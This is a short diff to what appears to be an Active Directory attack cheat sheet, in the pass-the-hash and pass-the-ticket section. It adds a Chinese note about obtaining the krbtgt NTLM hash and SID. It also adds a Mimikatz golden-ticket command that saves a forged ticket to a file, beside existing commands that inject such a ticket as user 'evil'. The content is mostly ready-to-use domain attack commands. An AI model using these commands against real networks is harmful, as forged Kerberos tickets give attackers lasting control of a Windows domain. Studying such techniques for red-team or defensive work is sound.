@@ -115,6 +115,10 @@ PtH
 
 PtT
 ---
+    取得krbtgt的NTLM HASH&SID
     kerberos::golden /domain:lpt.com /sid:<SID> /krbtgt:<HASH> /user:evil /ptt
     misc::cmd
     klist add_bind lpt.com server2019.lpt.com 
+    kerberos::golden /domain:lpt.com /sid:<SID> /krbtgt:<HASH> /user:evil /ticket:evil.tck
+![image](https://github.com/user-attachments/assets/24f1ebad-a84c-4a3a-a530-a711c97a9dfe)
+
